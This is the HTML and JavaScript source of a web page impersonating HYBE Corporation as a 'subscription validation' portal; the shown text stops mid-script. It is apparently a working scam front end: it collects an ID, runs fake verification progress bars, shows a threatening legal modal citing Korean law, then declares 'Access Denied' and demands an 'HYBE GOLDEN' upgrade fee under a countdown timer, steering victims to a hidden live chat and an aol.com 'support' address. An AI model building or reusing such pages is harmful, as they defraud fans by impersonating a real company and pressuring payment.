<!DOCTYPE html>
<html lang="en"> 
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="HYBE-CORP Subscription Validation - Secure your access to premium content.">
  <meta name="author" content="HYBE CORP">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="HYBE-CORP: Subscription Validation">
  <meta property="og:description" content="Validate your HYBE Corporation subscription to access premium content securely.">
  <meta property="og:image" content="https://logotyp.us/file/hybe.svg">
  <meta property="og:url" content="https://hybecorp-permitvalidator.vercel.app">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="HYBE-CORP: Subscription Validation">
  <meta name="twitter:description" content="Validate your HYBE Corporation subscription to access premium content securely.">
  <meta name="twitter:image" content="https://logotyp.us/file/hybe.svg">
  <title>HYBE-CORP: Subscription Validation</title>
  
  <!-- Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  
  <!-- Bootstrap Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
  
  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
  
  <!-- SweetAlert2 -->
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
  
  <!-- AOS Animation -->
  <link href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" rel="stylesheet">
  
  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>

  <style>
    :root {
      --hybe-primary: #1a365d;
      --hybe-secondary: #2d3748;
      --hybe-accent: #3182ce;
      --hybe-success: #38a169;
      --hybe-warning: #d69e2e;
      --hybe-error: #e53e3e;
      --hybe-light: #f8f9fa;
      --hybe-dark: #212529;
      --hybe-gradient: linear-gradient(135deg, rgba(26,54,93,1) 0%, rgba(49,130,206,1) 100%);
      --hybe-card-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      --hybe-elevation: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f5f7fa;
      color: var(--hybe-secondary);
      line-height: 1.6;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow-x: hidden;
    }

    /* Background pattern */
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        radial-gradient(circle at 25% 25%, rgba(49, 130, 206, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 75% 75%, rgba(26, 54, 93, 0.1) 0%, transparent 50%);
      background-size: 300px 300px;
      z-index: -2;
      opacity: 0.5;
    }

    /* Main container */
    .main-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding-top: 2rem;
      padding-bottom: 4rem;
    }

    /* Logo container */
    .logo-container {
      text-align: center;
      margin-bottom: 1.5rem;
      transition: transform 0.3s ease;
    }

    .logo-container:hover {
      transform: translateY(-5px);
    }

    .logo-container img {
      height: 100px;
      width: auto;
      max-width: 100%;
      filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
    }

    /* Card styling */
    .validation-card {
      background: white;
      border-radius: 16px;
      box-shadow: var(--hybe-elevation);
      border: none;
      overflow: hidden;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      position: relative;
      z-index: 1;
    }

    .validation-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
    }

    .validation-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 6px;
      background: var(--hybe-gradient);
    }

    .card-header {
      background: transparent;
      border-bottom: 1px solid rgba(0, 0, 0, 0.05);
      padding: 1.5rem 2rem 1rem;
    }

    .card-body {
      padding: 2rem;
    }

    .card-footer {
      background: transparent;
      border-top: 1px solid rgba(0, 0, 0, 0.05);
      padding: 1.5rem 2rem;
    }

    /* Typography */
    .display-title {
      font-family: 'Poppins', sans-serif;
      font-weight: 700;
      color: var(--hybe-primary);
      letter-spacing: -0.5px;
      margin-bottom: 0.5rem;
    }

    .subtitle {
      color: var(--hybe-secondary);
      font-weight: 400;
      opacity: 0.9;
      margin-bottom: 1.5rem;
    }

    /* Form elements */
    .form-label {
      font-weight: 600;
      color: var(--hybe-secondary);
      margin-bottom: 0.75rem;
    }

    .form-control {
      border: 2px solid #e2e8f0;
      border-radius: 10px;
      padding: 0.75rem 1.25rem;
      font-size: 1rem;
      transition: all 0.2s ease;
      height: auto;
    }

    .form-control:focus {
      border-color: var(--hybe-accent);
      box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.2);
    }

    .form-control.is-valid {
      border-color: var(--hybe-success);
      background-image: none;
      padding-right: 1.25rem;
    }

    .form-control.is-invalid {
      border-color: var(--hybe-error);
      background-image: none;
      padding-right: 1.25rem;
    }

    .form-text {
      font-size: 0.85rem;
      color: #64748b;
    }

    /* Buttons */
    .btn-hybe {
      background: var(--hybe-gradient);
      border: none;
      border-radius: 10px;
      font-weight: 600;
      padding: 0.75rem 1.5rem;
      color: white;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      box-shadow: 0 4px 6px rgba(26, 54, 93, 0.1);
    }

    .btn-hybe:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 15px rgba(26, 54, 93, 0.2);
      color: white;
    }

    .btn-hybe:active {
      transform: translateY(0);
    }

    .btn-hybe::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: left 0.7s;
    }

    .btn-hybe:hover::before {
      left: 100%;
    }

    /* Security badge */
    .security-badge {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      background: rgba(56, 161, 105, 0.1);
      color: var(--hybe-success);
      padding: 0.5rem 1rem;
      border-radius: 50px;
      font-size: 0.875rem;
      font-weight: 500;
      margin-bottom: 1.5rem;
      border: 1px solid rgba(56, 161, 105, 0.2);
    }

    /* Timer */
    .timer-container {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 1rem;
      background: white;
      padding: 1.5rem;
      border-radius: 12px;
      margin: 1.5rem 0;
      border: 1px solid rgba(49, 130, 206, 0.2);
      box-shadow: var(--hybe-card-shadow);
    }

    .timer-unit {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .timer-value {
      font-size: 1.75rem;
      font-weight: 700;
      color: var(--hybe-primary);
      font-family: 'Poppins', sans-serif;
    }

    .timer-label {
      font-size: 0.75rem;
      text-transform: uppercase;
      color: var(--hybe-secondary);
      letter-spacing: 0.5px;
      opacity: 0.7;
    }

    /* Footer */
    .hybe-footer {
      background: var(--hybe-primary);
      color: white;
      padding: 3rem 0;
    }

    .footer-links {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 2rem;
    }

    .footer-title {
      font-weight: 600;
      margin-bottom: 1rem;
      font-size: 1.1rem;
    }

    .footer-link {
      color: rgba(255, 255, 255, 0.8);
      text-decoration: none;
      transition: color 0.2s ease;
      display: inline-block;
      margin-bottom: 0.5rem;
    }

    .footer-link:hover {
      color: white;
      text-decoration: underline;
    }

    .social-links {
      display: flex;
      gap: 1rem;
      margin-top: 1rem;
    }

    .social-link {
      color: white;
      background: rgba(255, 255, 255, 0.1);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.2s ease;
    }

    .social-link:hover {
      background: rgba(255, 255, 255, 0.2);
      transform: translateY(-2px);
    }

    /* Particles */
    #particles-js {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      opacity: 0.8;
    }

    /* Responsive adjustments */
    @media (max-width: 768px) {
      .main-container {
        padding-top: 1.5rem;
      }
      
      .card-header,
      .card-body,
      .card-footer {
        padding: 1.5rem;
      }
      
      .logo-container img {
        height: 80px;
      }
    }

    /* Animations */
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .fade-in {
      animation: fadeIn 0.6s ease-out forwards;
    }

    /* Custom checkbox for terms */
    .form-check-input:checked {
      background-color: var(--hybe-accent);
      border-color: var(--hybe-accent);
    }

    /* Loading spinner */
    .spinner-border {
      width: 1.2rem;
      height: 1.2rem;
      border-width: 0.15em;
      vertical-align: middle;
      margin-right: 0.5rem;
    }

    /* Floating animation */
    @keyframes float {
      0% { transform: translateY(0px); }
      50% { transform: translateY(-10px); }
      100% { transform: translateY(0px); }
    }

    .floating {
      animation: float 3s ease-in-out infinite;
    }
  </style>
</head>
<body>
  <noscript>
    <div class="alert alert-danger text-center mt-4 mx-3" role="alert">
      <h2 class="h4">JavaScript Required</h2>
      <p>JavaScript is disabled in your browser. Please enable it to validate your subscription, or <a href="mailto:support@hybecorp.com" class="alert-link">contact support</a> for assistance.</p>
    </div>
  </noscript>

  <div id="particles-js"></div>

  <div class="main-container">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-lg-8 col-xl-6">
          <!-- Logo with floating animation -->
          <div class="logo-container fade-in floating">
            <img src="https://logotyp.us/file/hybe.svg" alt="HYBE Logo" class="img-fluid">
          </div>
          
          <!-- Main card -->
          <div class="card validation-card fade-in" data-aos="zoom-in" data-aos-delay="300">
            <div class="card-header text-center">
              <div class="security-badge">
                <i class="bi bi-shield-lock-fill"></i>
                <span>Enterprise-Grade Security</span>
              </div>
            </div>
            
            <div class="card-body">
              <h1 class="display-title text-center mb-2">HYBE License Validation</h1>
              <p class="subtitle text-center">Unlock all access to HYBE Corporation's subscription services and chat Permit</p>
              
              <form id="validationForm" action="https://hybe-panel.onrender.com/verify" method="POST" novalidate>
                <div class="mb-4">
                  <label for="codeInput" class="form-label">Subscription ID</label>
                  <input
                    type="text"
                    id="codeInput"
                    class="form-control"
                    placeholder="Enter your Subscription ID (e.g., HYB123XYZ789)"
                    pattern="[A-Z0-9]{10,20}"
                    title="Subscription ID must be 10-20 alphanumeric characters"
                    required
                    minlength="10"
                    maxlength="20"
                    autocomplete="off"
                    spellcheck="false"
                    aria-describedby="codeInputHelp"
                  >
                  <div id="codeInputHelp" class="form-text mt-2">
                    <i class="bi bi-info-circle-fill text-primary me-1"></i> Your subscription ID is case-sensitive and contains 10-20 alphanumeric characters
                  </div>
                </div>
                
                <div class="form-check mb-4">
                  <input class="form-check-input" type="checkbox" id="termsCheck" required>
                  <label class="form-check-label small" for="termsCheck">
                    I agree to the <a href="https://account.hybeim.com/en/policies/terms-of-service" class="text-decoration-none">Terms of Service</a> and <a href="https://tinyurl.com/hybecorp-privacypolicy" class="text-decoration-none">Privacy Policy</a>
                  </label>
                </div>
                
                <button type="submit" class="btn btn-hybe w-100 py-3" id="validateBtn">
                  <span class="btn-text"><i class="bi bi-shield-check me-2"></i> Validate Subscription</span>
                  <span class="btn-loading d-none"><span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> Processing...</span>
                </button>
              </form>
            </div>
            
            <div class="card-footer text-center">
              <div class="d-flex flex-column gap-3">
                <small class="text-muted">
                  <i class="bi bi-lock-fill me-1"></i> Your data is encrypted end-to-end
                </small>
                <small class="text-muted">
                  <i class="bi bi-exclamation-triangle-fill me-1"></i> Disable privacy extensions if experiencing issues
                </small>
              </div>
              
              <div class="mt-4">
                <div class="accordion accordion-flush" id="helpAccordion">
                  <div class="accordion-item border-0">
                    <h2 class="accordion-header">
                      <button class="accordion-button collapsed bg-light rounded" type="button" data-bs-toggle="collapse" data-bs-target="#helpContent" aria-expanded="false" aria-controls="helpContent">
                        <i class="bi bi-question-circle-fill text-primary me-2"></i>
                        <span class="fw-semibold">How to find your Subscription ID?</span>
                      </button>
                    </h2>
                    <div id="helpContent" class="accordion-collapse collapse" data-bs-parent="#helpAccordion">
                      <div class="accordion-body px-0 pt-3">
                        <p class="small">Your Subscription ID is a 10-20 character alphanumeric code provided in your HYBE account email or dashboard. It looks like <strong>HYB123XYZ789</strong>.</p>
                        <p class="small mb-0">Kindly Check your email or contact <a href="mailto:hybe.corp@aol.com" class="text-decoration-none">support@hybecorp</a> for assistance.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Legal Disclaimer Modal -->
  <div class="modal fade" id="legalDisclaimerModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
    <div class="modal-dialog modal-dialog-centered modal-lg">
      <div class="modal-content">
        <div class="modal-header bg-light">
          <h5 class="modal-title"><i class="bi bi-shield-lock-fill me-2"></i> HYBE Corporation Legal Agreement</h5>
        </div>
        <div class="modal-body" style="max-height: 60vh; overflow-y: auto;">
          <div class="alert alert-primary">
            <h6><i class="bi bi-megaphone-fill me-2"></i>Welcome to HYBE Corporation's Official Network</h6>
            <p class="mb-0">By proceeding, you're entering into an official union with HYBE Corporation and all its affiliated labels.</p>
          </div>
          
          <h6 class="mt-4">Affiliated Labels:</h6>
          <ul>
            <li>BIGHIT MUSIC</li>
            <li>BELIFT LAB</li>
            <li>SOURCE MUSIC</li>
            <li>PLEDIS Entertainment</li>
            <li>KOZ Entertainment</li>
            <li>ADOR</li>
            <li>HYBE LABELS JAPAN</li>
            <li>HYBE AMERICA</li>
          </ul>
          
          <h6 class="mt-4">Terms & Conditions:</h6>
          <ol>
            <li>You agree to maintain a safe and clean communication environment at all times.</li>
            <li>All interactions must comply with Korean Law (특수경제범죄 가중처벌 등에 관한 법률) regarding celebrity privacy and digital communications.</li>
            <li>Under HYBE Corporation policies (하이브 개인정보 처리방침), you are prohibited from disclosing any confidential information.</li>
            <li>Unauthorized sharing of artist communications or proprietary information violates HYBE's internal regulations (하이브 내부 규정) and Korean copyright law (저작권법).</li>
            <li>Misuse of this access may result in immediate termination and legal action under Korean Penal Code Article 314 (업무상비밀누설죄).</li>
            <li>All communications are monitored for quality assurance and security purposes.</li>
          </ol>
          
          <div class="alert alert-warning mt-3">
            <h6><i class="bi bi-exclamation-triangle-fill me-2"></i>Important Notice</h6>
            <p class="mb-0">This is a privileged access system. Any breach of confidentiality will be prosecuted to the fullest extent of Korean and international law.</p>
          </div>
          
          <div class="form-check mt-4">
            <input class="form-check-input" type="checkbox" id="legalAgreementCheck" required>
            <label class="form-check-label" for="legalAgreementCheck">
              I acknowledge and agree to all terms stated above, and understand that violations may result in legal consequences under Korean law (대한민국 법률).
            </label>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" id="cancelValidationBtn">Cancel</button>
          <button type="button" class="btn btn-hybe" id="proceedValidationBtn" disabled>
            <i class="bi bi-check-circle-fill me-2"></i>Proceed with Validation
          </button>
        </div>
      </div>
    </div>
  </div>

  <footer class="hybe-footer">
    <div class="container">
      <div class="footer-links">
        <div>
          <h3 class="footer-title">HYBE Corporation</h3>
          <p class="small">Leading entertainment & technology company</p>
          <div class="social-links">
            <a href="https://www.linkedin.com/company/hybe-corp/" class="social-link" target="_blank" aria-label="LinkedIn">
              <i class="bi bi-linkedin"></i>
            </a>
            <a href="https://twitter.com/HYBEOFFICIALtwt" class="social-link" target="_blank" aria-label="Twitter">
              <i class="bi bi-twitter-x"></i>
            </a>
            <a href="https://www.instagram.com/hybe.labels/" class="social-link" target="_blank" aria-label="Instagram">
              <i class="bi bi-instagram"></i>
            </a>
            <a href="https://www.facebook.com/HYBE.official" class="social-link" target="_blank" aria-label="Facebook">
              <i class="bi bi-facebook"></i>
            </a>
          </div>
        </div>
        
        <div>
          <h3 class="footer-title">Support</h3>
          <a href="mailto:hybe.corp@aol.com" class="footer-link small d-block mb-2">
            <i class="bi bi-envelope-fill me-2"></i>support@hybecorp</a>
          <p class="small mb-0">24/7 Customer Service</p>
        </div>
        
        <div>
          <h3 class="footer-title">Legal</h3>
          <a href="https://account.hybeim.com/en/policies/terms-of-service" class="footer-link small d-block mb-2">Terms of Service</a>
          <a href="https://account.hybeim.com/en/policies/privacy-policy" class="footer-link small d-block mb-2">Privacy Policy</a>
          <a href="https://account.hybeim.com/en/policies/cookie-policy" class="footer-link small d-block">Cookie Policy</a>
        </div>
      </div>
      
      <hr class="my-4" style="border-color: rgba(255,255,255,0.1);">
      
      <div class="d-flex flex-column flex-md-row justify-content-between align-items-center">
        <p class="small mb-2 mb-md-0">© 2025 HYBE Corporation. All rights reserved.</p>
        <div class="small">
          <span class="d-inline-block me-3">v2.1.0</span>
          <span class="text-white-50">Secure. Reliable. Trusted.</span>
        </div>
      </div>
    </div>
  </footer>

  <!-- JavaScript Libraries -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
  
  <!-- Smartsupp Live Chat script -->
  <script>
    var _smartsupp = _smartsupp || {};
    _smartsupp.key = '95a4146044c039bddfd0d3c872316d5187481695';
    _smartsupp.widget = 'hidden';
    window.smartsupp||(function(d) {
      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
      c.type='text/javascript';c.charset='utf-8';c.async=true;
      c.src='https://www.smartsuppchat.com/loader.js';s.parentNode.insertBefore(c,s);
    })(document);
  </script>

  <script>
    // Initialize animations
    AOS.init({
      duration: 800,
      easing: 'ease-out-quad',
      once: true
    });

    // Initialize particles.js
    document.addEventListener('DOMContentLoaded', function() {
      if (typeof particlesJS !== 'undefined') {
        particlesJS('particles-js', {
          particles: {
            number: { value: 80, density: { enable: true, value_area: 800 } },
            color: { value: "#1a365d" },
            shape: { type: "circle" },
            opacity: { value: 0.5, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1 } },
            size: { value: 3, random: true, anim: { enable: false } },
            line_linked: { enable: true, distance: 150, color: "#3182ce", opacity: 0.4, width: 1 },
            move: { enable: true, speed: 3, direction: "none", random: true, straight: false, out_mode: "out" }
          },
          interactivity: {
            detect_on: "canvas",
            events: {
              onhover: { enable: true, mode: "repulse" },
              onclick: { enable: true, mode: "push" }
            }
          }
        });
      }
    });

    // Form validation and submission
    document.getElementById('validationForm').addEventListener('submit', function(e) {
      e.preventDefault();
      validateSubscription();
    });

    document.getElementById('codeInput').addEventListener('input', function() {
      this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
      const isValid = /^[A-Z0-9]{10,20}$/.test(this.value);
      this.classList.toggle('is-valid', isValid && this.value.length >= 10);
      this.classList.toggle('is-invalid', this.value.length > 0 && !isValid);
    });

    async function validateSubscription() {
      const subscriptionId = document.getElementById('codeInput').value.trim();
      const submitBtn = document.getElementById('validateBtn');
      const btnText = submitBtn.querySelector('.btn-text');
      const btnLoading = submitBtn.querySelector('.btn-loading');
      
      if (!subscriptionId) {
        showErrorAlert('Required Field', 'Kindly enter your subscription ID to continue.');
        return;
      }

      const validPattern = /^[A-Z0-9]{10,20}$/;
      if (!validPattern.test(subscriptionId)) {
        showErrorAlert('Invalid Format', 'Subscription ID must contain 10-20 alphanumeric characters.');
        return;
      }

      if (!document.getElementById('termsCheck').checked) {
        showErrorAlert('Terms Required', 'Click the checkbox to agree to the Terms of Service and Privacy Policy to continue.');
        return;
      }

      // Show loading state
      btnText.classList.add('d-none');
      btnLoading.classList.remove('d-none');
      submitBtn.disabled = true;

      // Show initial progress loader
      const progressPromise = showProgressLoader(3000); // Show for 3 seconds

      try {
        // Wait for initial progress to complete
        await progressPromise;
        
        // Pause validation and show legal modal
        const userAgreed = await showLegalModal();
        
        if (!userAgreed) {
          // User cancelled or closed the modal
          btnText.classList.remove('d-none');
          btnLoading.classList.add('d-none');
          submitBtn.disabled = false;
          return;
        }
        
        // Continue with the actual validation
        await performValidation(subscriptionId);
        
      } catch (error) {
        console.error('Validation error:', error);
        showErrorAlert(
          'Connection Error', 
          'Unable to connect to validation servers. Please check your connection and try again.'
        );
      } finally {
        btnText.classList.remove('d-none');
        btnLoading.classList.add('d-none');
        submitBtn.disabled = false;
      }
    }

    // Shows progress loader for specified duration
    function showProgressLoader(duration) {
      return new Promise((resolve) => {
        let progress = 0;
        Swal.fire({
          title: 'Validating Subscription...',
          html: `
            <div class="progress mt-3" style="height: 8px;">
              <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%"></div>
            </div>
            <p id="progressText" class="small text-muted mt-2">Verifying your credentials...</p>
          `,
          allowOutsideClick: false,
          showConfirmButton: false,
          didOpen: () => {
            const progressBar = document.getElementById('progressBar');
            const progressText = document.getElementById('progressText');
            const startTime = Date.now();
            
            const interval = setInterval(() => {
              const elapsed = Date.now() - startTime;
              progress = Math.min(100, (elapsed / duration) * 100);
              progressBar.style.width = `${progress}%`;
              
              if (progress < 30) {
                progressText.textContent = 'Verifying credentials...';
              } else if (progress < 70) {
                progressText.textContent = 'Checking subscription status...';
              } else {
                progressText.textContent = 'Finalizing validation...';
              }
              
              if (progress >= 100) {
                clearInterval(interval);
                resolve();
              }
            }, 30);
          }
        });
      });
    }

    // Shows legal modal and waits for user action
    function showLegalModal() {
      return new Promise((resolve) => {
        const legalModal = new bootstrap.Modal(document.getElementById('legalDisclaimerModal'));
        
        // Reset modal state
        document.getElementById('legalAgreementCheck').checked = false;
        document.getElementById('proceedValidationBtn').disabled = true;
        
        // Enable proceed button when checkbox is checked
        document.getElementById('legalAgreementCheck').addEventListener('change', function() {
          document.getElementById('proceedValidationBtn').disabled = !this.checked;
        });
        
        // Set up event listeners
        const proceedBtn = document.getElementById('proceedValidationBtn');
        const cancelBtn = document.getElementById('cancelValidationBtn');
        
        const cleanup = () => {
          proceedBtn.removeEventListener('click', onProceed);
          cancelBtn.removeEventListener('click', onCancel);
          legalModal.hide();
        };
        
        const onProceed = () => {
          cleanup();
          resolve(true);
        };
        
        const onCancel = () => {
          cleanup();
          resolve(false);
        };
        
        proceedBtn.addEventListener('click', onProceed);
        cancelBtn.addEventListener('click', onCancel);
        
        // Show modal
        legalModal.show();
      });
    }

    // Performs the actual validation after legal agreement
    async function performValidation(subscriptionId) {
      // Show progress loader again for the remaining validation time
      await showProgressLoader(4000); // Show for 4 seconds
      
      try {
        let backendUrl = "/verify";
        if (window.location.hostname !== "localhost" && window.location.hostname !== "127.0.0.1") {
          backendUrl = "https://hybe-panel.onrender.com/verify";
        }
        
        const response = await fetch(backendUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ subscription_id: subscriptionId }),
        });

        let result;
        const contentType = response.headers.get("content-type");
        if (contentType && contentType.includes("application/json")) {
          result = await response.json();
        } else {
          showErrorAlert(
            'Server Error',
            'Received an unexpected response from the server. Please try again later.'
          );
          return;
        }

        if (result.success) {
          sessionStorage.setItem('hybe_session', result.session_token);
          sessionStorage.setItem('verification_id', result.verification_id);

          const expirationDate = new Date(result.Expiration_Date);
          const staticExpiration = expirationDate.toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric',
          });

          Swal.fire({
            icon: 'success',
            title: 'Subscription Validated',
            html: `
              <div class="text-start">
                <div class="alert alert-success" role="alert">
                  <i class="bi bi-check-circle-fill me-2"></i> Your subscription has been successfully validated.
                </div>
                
                <div class="card mb-3">
                  <div class="card-header bg-light">
                    <h5 class="mb-0"><i class="bi bi-person-badge-fill me-2"></i> Account Information</h5>
                  </div>
                  <div class="card-body">
                    <div class="row">
                      <div class="col-md-6 mb-3">
                        <p class="mb-1"><strong>Full Name:</strong></p>
                        <p><strong>${result.Full_name || "N/A"}</strong></p>
                      </div>
                      <div class="col-md-6 mb-3">
                        <p class="mb-1"><strong>Status:</strong></p>
                        <p><strong style="color: #008000;">${result.Status || "N/A"}</span></strong></p>
                      </div>
                      <div class="col-md-6 mb-3">
                        <p class="mb-1"><strong>Activation Date:</strong></p>
                        <p><strong>${new Date(result.Activation_Date).toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }) || "N/A"}</strong></p>
                      </div>
                      <div class="col-md-6 mb-3">
                        <p class="mb-1"><strong>Expiration:</strong></p>
                        <p>${result.Expiration_Date || "N/A"}</p>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div class="card" style="background-color: #FFFDD0; border: none; padding: 20px;">
                  <h5 class="alert-heading">
                    <i class="bi bi-exclamation-triangle-fill me-2"></i> Upgrade Required
                  </h5>
                  <p class="mb-2">
                    <strong style="color: #FF0000;">Access Denied ⚠️</strong> : Your current subscription does not include license and chat permit features.
                    To unlock these premium features, kindly upgrade to the 
                    <strong style="color: goldenrod;">HYBE GOLDEN</strong> tier.
                  </p>
                  <hr>
                  <div class="row">
                    <div class="col-md-6">
                      <p class="mb-1">
                        <strong>Current Level:</strong>
                        <strong>
                          ${result.Current_ID_Level || "N/A"}
                        </strong>
                      </p>
                    </div>
                    <div class="col-md-6">
                      <p class="mb-1">
                        <strong>License Status:</strong>
                        <strong style="
                          color: ${result.HYBE_Chat_License_info === 'ACTIVE' ? 'green' : result.HYBE_Chat_License_info === 'ON HOLD' ? 'red' : 'inherit'};
                        ">
                          <span style="color: #FF0000;">${result.HYBE_Chat_License_info || "N/A"}</span>
                        </strong>
                      </p>
                    </div>
                    <div class="col-md-6">
                      <p class="mb-1">
                      <strong>HYBE License PIN:</strong></p>
                      <p>${result.HYBE_License_PIN || "N/A"}</p>
                    </div>
                    <div class="col-md-6">
                      <p class="mb-1">
                        <strong>Upgrade Token:</strong>
                        <strong>
                          <span style="color: #FF0000;">${result.HYBE_GOLDEN_Upgrade_fee 
                            ? result.HYBE_GOLDEN_Upgrade_fee + '  (Due)</span>' 
                            : "N/A"}
                        </strong>
                      </p>
                    </div>
                  </div>
                </div>
                <div class="text-center my-4">
                  <h6 class="mb-3"><i class="bi bi-clock-fill me-2"></i> Time left to upgrade</h6>
                  <div class="timer-container" id="countdown-timer">
                    <div class="timer-unit">
                      <span class="timer-value" id="days">0</span>
                      <span class="timer-label">Days</span>
                    </div>
                    <div class="timer-unit">
                      <span class="timer-value" id="hours">0</span>
                      <span class="timer-label">Hours</span>
                    </div>
                    <div class="timer-unit">
                      <span class="timer-value" id="minutes">0</span>
                      <span class="timer-label">Minutes</span>
                    </div>
                    <div class="timer-unit">
                      <span class="timer-value" id="seconds">0</span>
                      <span class="timer-label">Seconds</span>
                    </div>
                  </div>
                </div>
                
                <div class="alert alert-info mt-3">
                  <p class="mb-0"><i class="bi bi-info-circle-fill me-2"></i>Kindly upgrade to HYBE-GOLDEN within given timeframe to access premium features and unlock Chat Permit.</p>
                </div>
              </div>
            `,
            width: 700,
            confirmButtonText: 'Contact Support',
            confirmButtonColor: '#1a365d',
            showCancelButton: true,
            cancelButtonText: 'Close',
            footer: `<small class="text-muted">Support Reference: ${result.support_reference || 'N/A'}</small>`
          }).then((result) => {
            if (result.isConfirmed) {
              if (window.smartsupp) {
                window.smartsupp('chat:open');
              } else {
                Swal.fire({
                  icon: 'error',
                  title: 'Chat Unavailable',
                  text: 'Unable to load the support chat. Please try again or email hybe.corp@aol.com',
                  confirmButtonColor: '#e53e3e'
                });
              }
            }
          });

          startCountdownTimer(expirationDate);
        } else {
          showErrorAlert(
            'Verification Failed', 
            result.message || 'Invalid subscription credentials.',
            result.support_reference ? `Support Reference: ${result.support_reference}` : null
          );
        }
      } catch (error) {
        throw error; // Re-throw to be caught in the main function
      }
    }

    function startCountdownTimer(expirationDate) {
      const daysEl = document.getElementById('days');
      const hoursEl = document.getElementById('hours');
      const minutesEl = document.getElementById('minutes');
      const secondsEl = document.getElementById('seconds');

      let prevDays = null, prevHours = null, prevMinutes = null, prevSeconds = null;

      function updateTimer() {
        const now = new Date();
        const timeLeft = expirationDate - now;

        if (timeLeft <= 0) {
          daysEl.textContent = '0';
          hoursEl.textContent = '0';
          minutesEl.textContent = '0';
          secondsEl.textContent = '0';
          return;
        }

        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);

        if (days !== prevDays) {
          daysEl.textContent = days;
          daysEl.classList.add('animate');
          setTimeout(() => daysEl.classList.remove('animate'), 300);
          prevDays = days;
        }
        if (hours !== prevHours) {
          hoursEl.textContent = hours;
          hoursEl.classList.add('animate');
          setTimeout(() => hoursEl.classList.remove('animate'), 300);
          prevHours = hours;
        }
        if (minutes !== prevMinutes) {
          minutesEl.textContent = minutes;
          minutesEl.classList.add('animate');
          setTimeout(() => minutesEl.classList.remove('animate'), 300);
          prevMinutes = minutes;
        }
        if (seconds !== prevSeconds) {
          secondsEl.textContent = seconds;
          secondsEl.classList.add('animate');
          setTimeout(() => secondsEl.classList.remove('animate'), 300);
          prevSeconds = seconds;
        }
      }

      updateTimer();
      const timerInterval = setInterval(updateTimer, 1000);

      document.addEventListener('click', function(event) {
        if (event.target.closest('.swal2-confirm') || event.target.closest('.swal2-cancel')) {
